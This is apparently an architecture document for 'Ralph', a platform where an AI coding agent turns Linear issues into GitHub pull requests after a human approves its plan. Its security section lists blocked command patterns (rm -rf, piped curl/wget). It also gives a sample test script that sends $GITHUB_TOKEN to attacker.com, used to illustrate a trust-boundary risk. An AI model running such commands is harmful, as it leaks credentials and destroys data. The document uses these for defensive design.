# Ralph Platform - Technical Architecture

This document provides a deep dive into Ralph's technical architecture, components, and workflows.

## Table of Contents

- [System Architecture](#system-architecture)
- [Core Components](#core-components)
- [Workflows](#workflows)
- [Security Architecture](#security-architecture)
- [Data Flow](#data-flow)
- [Storage & State](#storage--state)

## System Architecture

```mermaid
graph TB
    subgraph "External Services"
        Linear[Linear<br/>Issue Tracker]
        GitHub[GitHub<br/>Version Control]
        Langfuse[Langfuse<br/>Observability]
    end

    subgraph "Ralph Platform - GKE"
        subgraph "API Layer"
            API[API Server<br/>Express.js<br/>:3000]
            Ingress[GKE Ingress<br/>Load Balancer]
        end

        subgraph "Queue Layer"
            Redis[(Redis<br/>BullMQ)]
        end

        subgraph "Worker Layer"
            Worker1[Worker Pod 1]
            Worker2[Worker Pod 2]
        end

        subgraph "Persistent Storage"
            Cache[/Persistent Cache<br/>Claude Projects/]
        end

        subgraph "Worker Execution Context"
            Workspace[/Ephemeral Workspace<br/>/tmp/ralph-workspaces/]
            ClaudeCLI[Claude CLI<br/>Sonnet 4.5 / Haiku 4.5]
            Tools[Polyglot Tools<br/>Biome, TSC, Ruff, Mypy]
        end
    end

    Linear -->|Webhook POST| Ingress
    Ingress --> API
    API -->|Enqueue Job| Redis
    Redis -->|Dequeue Job| Worker1
    Redis -->|Dequeue Job| Worker2
    Worker1 --> Workspace
    Worker1 --> ClaudeCLI
    Worker1 --> Tools
    Worker1 <-->|Seed/Persist| Cache
    Worker1 -->|Push PR| GitHub
    Worker1 -->|Trace| Langfuse
    Worker2 --> Workspace
    Worker2 --> ClaudeCLI
    Worker2 --> Tools
    Worker2 <-->|Seed/Persist| Cache
    Worker2 -->|Push PR| GitHub
    Worker2 -->|Trace| Langfuse
```

## Core Components

### API Server (`src/server.ts`)

**Purpose**: Webhook ingestion and job enqueueing

**Responsibilities**:
- Receive and validate Linear webhooks (HMAC SHA-256)
- Filter issues by "Ralph" label
- **Filter Ralph's own comments to prevent auto-execution**
- Detect approval patterns (LGTM, approved, proceed, ship it)
- Move tickets between states based on user actions
- Enqueue tasks to BullMQ Redis queue
- Handle comment webhooks for plan approval/iteration
- Serve BullMQ dashboard at `/admin/queues`

**Comment Filtering (Critical Security)**:
Ralph's plan comments contain approval keywords in instructions, which could trigger auto-execution if not filtered. The API detects Ralph's comments by:
- Checking comment author name (contains "ralph" or "bot")
- Detecting Ralph's comment patterns ("🤖 Ralph", "Ralph's Implementation Plan")
- Ignoring these comments entirely to prevent webhook loops

**Key Endpoints**:
- `POST /webhook` - Linear webhook handler
- `GET /health` - Health check endpoint
- `GET /admin/queues` - BullMQ dashboard (basic auth protected)

**Configuration**:
```typescript
{
  concurrency: 2,           // Parallel jobs per worker
  rateLimiter: {
    max: 5,                 // Max 5 jobs
    duration: 60000         // Per 60 seconds
  },
  retry: {
    attempts: 3,
    backoff: 'exponential'
  }
}
```

### Worker (`src/worker.ts`)

**Purpose**: Job processing and orchestration

**Responsibilities**:
- Dequeue tasks from Redis
- Initialize ephemeral workspaces
- Orchestrate agent execution
- Handle retry logic
- Report failures to Linear

**Job Types**:
- `plan-only` - Generate implementation plan
- `execute-only` - Execute approved plan
- `full` - Plan + execute (legacy mode)

### Agent (`src/agent.ts`)

**Purpose**: AI workflow orchestration

**Responsibilities**:
- Manage three execution modes (plan-only, execute-only, full)
- Execute Claude Sonnet 4.5 for planning ($0.50 limit) and coding ($2.00 limit)
- Use Claude Haiku 4.5 for error summarization ($0.10 limit)
- Load repository skills from `.ralph/skills/`
- Run polyglot validation
- Create GitHub PRs
- Update Linear issue states
- Trace execution with Langfuse

**Security Layer**:
```typescript
const SECURITY_GUARDRAILS = `
  1. NO SECRETS - Never expose API keys or credentials
  2. SANDBOX ONLY - Only modify files in workspace
  3. NO DESTRUCTIVE OPS - No rm -rf, no force push to main
`;
```

### Workspace (`src/workspace.ts`)

**Purpose**: Git workspace isolation

**Responsibilities**:
- Create UUID-based ephemeral directories (`/tmp/ralph-workspaces/{uuid}`)
- Clone repositories with OAuth token authentication
- Create/checkout feature branches (`ralph/feat-{identifier}`)
- Configure git identity (Ralph Bot <ralph@duvo.ai>)
- Cleanup after job completion

**Structure**:
```
/tmp/ralph-workspaces/{uuid}/
  └── repo/          # Git repository clone
  └── home/          # Isolated $HOME for Claude CLI
      └── .claude/   # Claude projects cache
```

### Tools (`src/tools.ts`)

**Purpose**: Polyglot code validation

**Auto-Detection**:
- **TypeScript/JavaScript**: Biome + TSC
- **Python**: Ruff + Mypy
- **Security**: Trivy (vulnerabilities, secrets, misconfigurations - MIT license)

**Validation Flow**:
1. Detect project type (`package.json`, `pyproject.toml`, etc.)
2. Run linters with auto-fix enabled
3. Run type checkers
4. Run security scanners
5. Return aggregated results

**Failures**: Still push to GitHub with `wip:` prefix to preserve work

**License Compliance**: All validation tools use permissive licenses (MIT/Apache):
- Biome: MIT
- Ruff: MIT
- Mypy: MIT
- Trivy: Apache 2.0

Note: Semgrep (GnuGPLv2) was intentionally replaced with Trivy to maintain license compatibility.

### Linear Client (`src/linear-client.ts`)

**Purpose**: Linear API integration

**Responsibilities**:
- Post comments to issues
- Update issue states with fallback mechanism
- Get issue state information
- Handle state synonyms for flexibility

**State Synonyms**:
```typescript
'in progress': ['in progress', 'wip', 'doing']
'in review': ['in review', 'under review', 'peer review', 'review', 'pr']
'todo': ['todo', 'triage', 'backlog', 'unstarted', 'ready']
'done': ['done', 'completed', 'closed']
```

**State Usage**:
- **Todo**: Awaiting human plan approval
- **In Progress**: Ralph actively working (planning, coding, processing feedback)
- **In Review**: PR created, awaiting merge
- **Done**: Task completed (manual transition)

### Plan Store (`src/plan-store.ts`)

**Purpose**: Redis-based plan persistence

**Storage Key Pattern**: `ralph:plan:{issueId}`

**Plan Structure**:
```typescript
{
  taskId: string,
  plan: string,                    // Sonnet 4.5-generated plan
  taskContext: {
    ticketId: string,
    title: string,
    description: string,
    repoUrl: string,
    branchName: string,
    isIteration: boolean           // PR iteration flag
  },
  feedbackHistory: string[],      // Accumulated feedback
  status: 'pending-review' | 'approved' | 'needs-revision',
  createdAt: Date
}
```

**TTL**: 7 days (configurable via `PLAN_TTL_DAYS`)

## Workflows

### Workflow 1: Human-in-the-Loop Planning (Default)

```mermaid
sequenceDiagram
    participant User
    participant Linear
    participant API
    participant Redis
    participant Worker
    participant Sonnet as Claude Sonnet 4.5
    participant Store as Plan Store

    User->>Linear: Create issue with "Ralph" label
    Linear->>API: Webhook: issue.create
    API->>API: Validate signature
    API->>API: Check "Ralph" label
    API->>Redis: Enqueue plan-only job
    API-->>Linear: 200 OK

    Redis->>Worker: Dequeue job
    Worker->>Worker: Clone repo to workspace
    Worker->>Linear: Update state: → In Progress
    Worker->>Linear: Comment: "Generating plan..."
    Worker->>Sonnet: Generate plan ($0.50 budget)
    Sonnet-->>Worker: Return plan
    Worker->>Store: Store plan (TTL: 7 days)
    Worker->>Linear: Post formatted plan as comment
    Worker->>Linear: Update state: In Progress → Todo
    Worker-->>Redis: Job COMPLETED

    Note over Linear,User: Human reviews plan (ticket in Todo)

    alt User Approves (LGTM)
        User->>Linear: Comment: "LGTM"
        Linear->>API: Webhook: comment.create
        API->>API: Filter Ralph's own comments
        API->>API: Detect approval pattern
        API->>Linear: Move ticket: Todo → In Progress
        API->>Store: Retrieve stored plan
        API->>Redis: Enqueue execute-only job
        API-->>Linear: 200 OK

        Redis->>Worker: Dequeue execute job
        Worker->>Worker: Execute approved plan
        Worker->>Worker: Validate code
        Worker->>Worker: Commit & push
        Worker->>GitHub: Create PR
        Worker->>Worker: Wait 3s for Linear auto-switch
        Worker->>Linear: Check if auto-switched to In Review
        alt Linear auto-switched
            Worker->>Linear: Comment: "✅ PR created"
        else Manual update needed
            Worker->>Linear: Update state: In Progress → In Review
            Worker->>Linear: Comment: "✅ PR created"
        end
        Worker->>Store: Delete plan
        Worker-->>Redis: Job COMPLETED

    else User Requests Changes
        User->>Linear: Comment: "Please add error handling"
        Linear->>API: Webhook: comment.create
        API->>API: Filter Ralph's own comments
        API->>API: Not approval → feedback
        API->>Linear: Move ticket: Todo → In Progress
        API->>Store: Append feedback to plan
        API->>Redis: Enqueue re-planning job
        API-->>Linear: 200 OK

        Redis->>Worker: Dequeue re-plan job
        Worker->>Sonnet: Generate revised plan (with feedback, $0.50)
        Sonnet-->>Worker: Return revised plan
        Worker->>Store: Update stored plan
        Worker->>Linear: Post revised plan
        Worker->>Linear: Update state: In Progress → Todo
        Worker-->>Redis: Job COMPLETED
    end
```

### Workflow 2: PR Iteration Workflow (New)

```mermaid
sequenceDiagram
    participant User
    participant Linear
    participant API
    participant Redis
    participant Worker
    participant Sonnet as Claude Sonnet 4.5
    participant GitHub
    participant CI as CI/SonarQube

    Note over Linear,GitHub: Initial PR already created

    GitHub->>CI: PR created, run checks
    CI-->>GitHub: ❌ Tests failing

    User->>Linear: Comment: "fix failing tests"
    Note over Linear: Ticket in "In Review" state<br/>No stored plan exists

    Linear->>API: Webhook: comment.create
    API->>API: Check state = "In Review"
    API->>API: Check no stored plan
    API->>API: Detect iteration request
    API->>Redis: Enqueue plan-only job (isIteration: true)
    API-->>Linear: 200 OK

    Redis->>Worker: Dequeue iteration job
    Worker->>Worker: Clone existing branch
    Worker->>Linear: Update state: In Review → In Progress
    Worker->>Linear: Comment: "Creating iteration plan..."
    Worker->>Sonnet: Generate fix plan ($0.50 budget)
    Note over Sonnet: Context includes:<br/>- Existing PR branch<br/>- User feedback<br/>- "Review git log/diff"
    Sonnet-->>Worker: Return iteration plan
    Worker->>Worker: Store plan (with isIteration flag)
    Worker->>Linear: Post iteration plan
    Worker->>Linear: Update state: In Progress → Todo
    Worker-->>Redis: Job COMPLETED

    User->>Linear: Comment: "approved"
    Linear->>API: Webhook: comment.create
    API->>API: Detect approval
    API->>Worker: Retrieve stored plan (isIteration: true)
    API->>Redis: Enqueue execute job (isIteration: true)
    API-->>Linear: 200 OK

    Redis->>Worker: Dequeue execute job
    Worker->>Worker: Checkout existing branch
    Worker->>Linear: Update state: Todo → In Progress
    Worker->>Sonnet: Execute iteration plan ($2.00 budget)
    Sonnet-->>Worker: Code changes
    Worker->>Worker: Validate code
    Worker->>Worker: Commit changes
    Worker->>GitHub: Push (NO --force, preserve history)
    Note over GitHub: Push to existing PR branch<br/>PR automatically updated
    Worker->>Linear: Update state: In Progress → In Review
    Worker->>Linear: Comment: "✅ Iteration complete"
    Worker->>Worker: Keep stored plan (allow more iterations)
    Worker-->>Redis: Job COMPLETED

    GitHub->>CI: New commit, run checks
    CI-->>GitHub: ✅ All passing

    Note over User,CI: Can iterate again if needed:<br/>Another comment → new plan → approve → push
```

### Workflow 3: Legacy Mode (Plan + Execute)

```mermaid
sequenceDiagram
    participant User
    participant Linear
    participant API
    participant Redis
    participant Worker
    participant Sonnet as Claude Sonnet 4.5
    participant GitHub

    Note over API: PLAN_REVIEW_ENABLED=false

    User->>Linear: Create issue with "Ralph" label
    Linear->>API: Webhook: issue.create
    API->>API: Validate signature
    API->>API: Check "Ralph" label
    API->>Redis: Enqueue full job (plan + execute)
    API-->>Linear: 200 OK

    Redis->>Worker: Dequeue full job
    Worker->>Worker: Clone repo
    Worker->>Linear: Update state: Backlog → In Progress
    Worker->>Linear: Comment: "Ralph started working"

    Worker->>Sonnet: Generate plan ($0.50 budget)
    Sonnet-->>Worker: Return plan

    Worker->>Sonnet: Execute plan ($2.00 budget)
    Sonnet-->>Worker: Code changes

    Worker->>Worker: Validate code
    Worker->>Worker: Commit & push
    Worker->>GitHub: Create PR
    Worker->>Linear: Update state: In Progress → In Review
    Worker->>Linear: Comment: "✅ PR created"
    Worker-->>Redis: Job COMPLETED
```

## Security Architecture

### Defense in Depth

```mermaid
graph TD
    Input[User Input] --> Webhook[Webhook Validation<br/>HMAC SHA-256]
    Webhook --> Queue[Queue Isolation<br/>BullMQ]
    Queue --> Worker[Worker Isolation<br/>UUID Workspaces]

    Worker --> Commands[Command Allowlist]
    Worker --> Patterns[Dangerous Pattern Blocking]
    Worker --> Resources[Resource Limits]
    Worker --> Paths[Path Traversal Protection]

    Commands --> Validation[Code Validation<br/>Linters + Type Checkers]
    Patterns --> Validation
    Resources --> Validation
    Paths --> Validation

    Validation --> Scanning[Security Scanning<br/>Trivy]
    Scanning --> GitHub[GitHub PR]

    style Webhook fill:#f9f,stroke:#333
    style Commands fill:#9ff,stroke:#333
    style Patterns fill:#9ff,stroke:#333
    style Resources fill:#9ff,stroke:#333
    style Paths fill:#9ff,stroke:#333
    style Scanning fill:#9f9,stroke:#333
```

### Command Execution Security

**1. Allowlist Validation**

Only whitelisted command patterns are permitted:
```typescript
const ALLOWED_PATTERNS = [
  /^npm (test|run build|install)/,
  /^npx /,
  /^node /,
  /^git (status|log|diff|show)/,
  /^(ls|cat|pwd|echo) /,
  /^(pytest|python -m pytest)/,
  /^(ruff|mypy)/
];
```

**2. Dangerous Pattern Blocking**

Commands containing these patterns are rejected:
```typescript
const DANGEROUS_PATTERNS = [
  /[;&|`$()]/,        // Shell metacharacters
  /rm\s+-rf/,          // Destructive operations
  />\s*\/dev\//,       // Device manipulation
  /(curl|wget).*\|/    // Piped downloads
];
```

**3. Resource Limits**
- **Timeout**: 60 seconds max execution
- **Buffer**: 1MB max output size
- **Output**: Truncated to 5000 chars (stdout) / 2000 chars (stderr)

**4. Path Traversal Protection**

All file operations validated:
```typescript
const resolvedPath = path.resolve(workDir, requestedPath);
if (!resolvedPath.startsWith(workDir)) {
  throw new Error("Path traversal blocked");
}
```

### Trust Boundary

⚠️ **Critical Limitation**: Commands like `npm test` and `pytest` can execute arbitrary code from `package.json` and test configs.

**Risk Example**:
```json
{
  "scripts": {
    "test": "curl http://attacker.com?secret=$GITHUB_TOKEN"
  }
}
```

**Recommended Deployment Models**:

| Environment | Risk | Recommendation |
|-------------|------|----------------|
| Trusted repos only | Low | Safe to use |
| Public/untrusted repos | High | Use isolated container without credentials |
| Production | Medium | Separate service account, minimal permissions |

**Mitigation Strategies**:
1. Network isolation (no internet access for worker pods)
2. Credential isolation (separate tokens per repo)
3. Resource quotas (CPU/memory limits)
4. Audit logging (Langfuse traces)
5. Manual review (require PR approval)

## Cost Optimizations

Ralph implements multiple strategies to minimize API costs while maintaining quality:

### Model Selection by Task
- **Planning**: Sonnet 4.5 with **$0.50 budget limit** - Balances quality and cost for implementation plans
- **Execution**: Sonnet 4.5 with **$2.00 budget limit** - Higher limit for complex code generation
- **Error Summarization**: Haiku 4.5 with **$0.10 budget limit** - Cost-efficient for post-mortem analysis

### Token Reduction: TOON Format

Ralph uses **TOON (Token-Optimized Object Notation)** to reduce context window usage by ~30-40% compared to JSON.

**MCP Server** (`src/mcp-toonify.ts`):
- Custom Model Context Protocol server
- Converts JSON responses to compact TOON format
- Used by agent for file listings, search results, and structured data

**Example Comparison**:
```
JSON (verbose):
{
  "files": ["src/agent.ts", "src/server.ts"],
  "status": "active",
  "count": 2
}

TOON (compact):
files: src/agent.ts, src/server.ts
status: active
count: 2
```

### Token-Optimized Skills

Ralph includes custom slash commands that output in TOON format:

**Available Skills** (`.claude/commands/`):
- `/project-map` - Tree structure in TOON format (replaces `ls -R`)
- `/trace-deps` - Dependency analysis
- `/test-filter` - Test file discovery

**Implementation**: Skills invoke external helper scripts (`~/.claude/scripts/`) that output pre-formatted TOON data, avoiding verbose tool outputs.

### Budget Enforcement

Hard limits prevent runaway costs:
```typescript
// src/agent.ts
'--max-budget-usd', '0.50'  // Planning phase
'--max-budget-usd', '2.00'  // Execution phase
'--max-budget-usd', '0.10'  // Error summary
```

If a budget is exceeded, Claude CLI automatically terminates and returns partial results.

## Data Flow

### Job Processing Pipeline

```mermaid
flowchart TD
    Start[Linear Webhook] --> Validate{Valid Signature?}
    Validate -->|No| Reject[Return 401]
    Validate -->|Yes| Label{Has 'Ralph' Label?}
    Label -->|No| Ignore[Return 200 Ignored]
    Label -->|Yes| State{Check Issue State}

    State -->|Backlog/Todo| Enqueue1[Enqueue plan-only job]
    State -->|Comment| FilterComment{Ralph's Own Comment?}

    FilterComment -->|Yes| Ignore2[Ignore to prevent auto-exec]
    FilterComment -->|No| CheckPlan{Stored Plan Exists?}

    CheckPlan -->|Yes + Approval| StateUpdate1[Move to In Progress]
    CheckPlan -->|Yes + Feedback| StateUpdate2[Move to In Progress]
    CheckPlan -->|No + In Review| Enqueue4[Enqueue iteration plan job]
    CheckPlan -->|No + Other State| Ignore

    StateUpdate1 --> Enqueue2[Enqueue execute-only job]
    StateUpdate2 --> Enqueue3[Enqueue re-plan job]

    Enqueue1 --> Redis[(Redis Queue)]
    Enqueue2 --> Redis
    Enqueue3 --> Redis
    Enqueue4 --> Redis

    Redis --> Worker[Worker Dequeues]
    Worker --> Clone[Clone Repo]
    Clone --> Mode{Job Mode?}

    Mode -->|plan-only| Planning[Sonnet 4.5: Generate Plan $0.50]
    Mode -->|execute-only| Execution[Sonnet 4.5: Execute Plan $2.00]
    Mode -->|full| Both[Sonnet 4.5: Plan → Execute]

    Planning --> Store[Store Plan in Redis]
    Store --> PostPlan[Post to Linear]
    PostPlan --> UpdateState1[Update State: Todo]
    UpdateState1 --> Complete1[Job Complete]

    Execution --> Validate[Validate Code]
    Validate --> Push[Push to GitHub]
    Push --> PR{Create PR?}
    PR -->|Yes| CreatePR[Create PR]
    PR -->|No| UpdatePR[Update existing PR]
    CreatePR --> Wait[Wait 3s for Linear auto-switch]
    Wait --> CheckSwitch{Linear auto-switched?}
    CheckSwitch -->|Yes| CommentOnly[Post comment only]
    CheckSwitch -->|No| UpdateState2[Update State: In Review]
    UpdatePR --> UpdateState3[State: In Review]
    UpdatePR --> UpdateState2
    UpdateState2 --> Cleanup[Delete Plan if not iteration]
    Cleanup --> Complete2[Job Complete]

    Both --> Validate
```

## Storage & State

### Redis Storage

**1. Job Queue** (`BullMQ`)
```
Queue: ralph-tasks
Jobs: {
  id: string,
  data: Task,
  opts: {
    attempts: 3,
    backoff: { type: 'exponential', delay: 2000 },
    removeOnComplete: { age: 3600 },
    removeOnFail: { age: 86400 }
  }
}
```

**2. Plan Storage**
```
Key: ralph:plan:{issueId}
Value: StoredPlan (JSON)
TTL: 7 days (configurable)
```

**3. Configuration Cache**
```
Key: ralph:config:repos
Value: Team → Repo mappings (JSON)
Key: ralph:config:version
Value: ConfigMap mtime
```

### Persistent Cache

**Location**: `/app/claude-cache` (persistent volume)

**Purpose**: Cache Claude CLI project metadata to avoid re-indexing

**Structure**:
```
/app/claude-cache/
  └── projects/
      └── {repo-hash}/
          └── .claude/
              └── projects/
                  └── {project-id}/
                      ├── index.json
                      └── metadata/
```

**Workflow**:
1. **Seed**: Before job execution, copy from persistent cache to ephemeral `$HOME`
2. **Persist**: After job execution, copy back to persistent cache
3. **Benefit**: Significant API cost reduction (no re-indexing on every job)

### State Transitions

```mermaid
stateDiagram-v2
    [*] --> Backlog: Issue created
    Backlog --> InProgress: Ralph starts planning
    InProgress --> PlanReview: Plan ready
    PlanReview --> InProgress: Plan approved
    PlanReview --> PlanReview: Feedback → re-plan
    InProgress --> InReview: PR created
    InReview --> InProgress: Iteration request
    InProgress --> Todo: Failure/No changes
    InReview --> Done: PR merged
    Todo --> [*]
    Done --> [*]

    note right of PlanReview
        Human approval loop
    end note

    note right of InReview
        CI/SonarQube iteration loop
    end note
```

### Linear State Synonyms

Ralph recognizes multiple state names:

| Canonical State | Synonyms | Usage |
|----------------|----------|-------|
| `Todo` | todo, triage, backlog, unstarted, ready | Plan awaiting human approval |
| `In Progress` | in progress, wip, doing | Ralph actively working |
| `In Review` | in review, under review, peer review, review, pr | PR created, awaiting merge |
| `Done` | done, completed, closed | Task completed (manual) |

**State Transition Flow**:
1. **Issue created** → `In Progress` (Ralph planning)
2. **Plan posted** → `Todo` (awaiting approval)
3. **User comments** → `In Progress` (processing feedback/approval)
4. **PR created** → `In Review` (with 3s wait for Linear auto-switch)
5. **PR merged** → `Done` (manual transition)

---

For deployment details, see **[DEPLOYMENT.md](./DEPLOYMENT.md)**.
For usage examples, see **[USER_GUIDE.md](./USER_GUIDE.md)**.
